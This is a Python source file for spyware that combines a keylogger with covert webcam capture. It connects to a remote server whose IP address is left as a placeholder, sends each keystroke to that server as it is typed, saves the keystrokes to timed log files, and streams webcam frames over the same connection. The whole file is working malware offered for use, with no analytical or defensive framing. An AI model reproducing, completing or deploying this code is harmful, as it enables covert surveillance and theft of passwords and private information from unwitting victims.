import socket
import cv2
import threading
import keyboard
from threading import Timer
from datetime import datetime

SERVER_HOST = "<Enter your server's IP Address here>"
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128
SEND_REPORT_EVERY = 10  # in seconds

# Create the socket object.
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

class Keylogger:
    def __init__(self, interval, server_socket, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.server_socket = server_socket

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
        self.send_keypress(name)

    def send_keypress(self, keypress):
        try:
            self.server_socket.sendall(keypress.encode())
        except Exception as e:
            print(f"Error sending keypress: {e}")

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "file":
                self.report_to_file()
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

# Function to record and send the video.
def record_video():
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, frame_bytes = cv2.imencode('.jpg', frame)
        frame_size = len(frame_bytes)
        s.sendall(frame_size.to_bytes(4, byteorder='little'))
        s.sendall(frame_bytes)
    cap.release()
    cv2.destroyAllWindows()

# Start recording video in a separate thread.
recording_thread = threading.Thread(target=record_video)
recording_thread.start()

# Start keylogger in a separate thread.
keylogger = Keylogger(interval=SEND_REPORT_EVERY, server_socket=s, report_method="file")
keylogger_thread = threading.Thread(target=keylogger.start)
keylogger_thread.start()

recording_thread.join()
keylogger_thread.join()

s.close()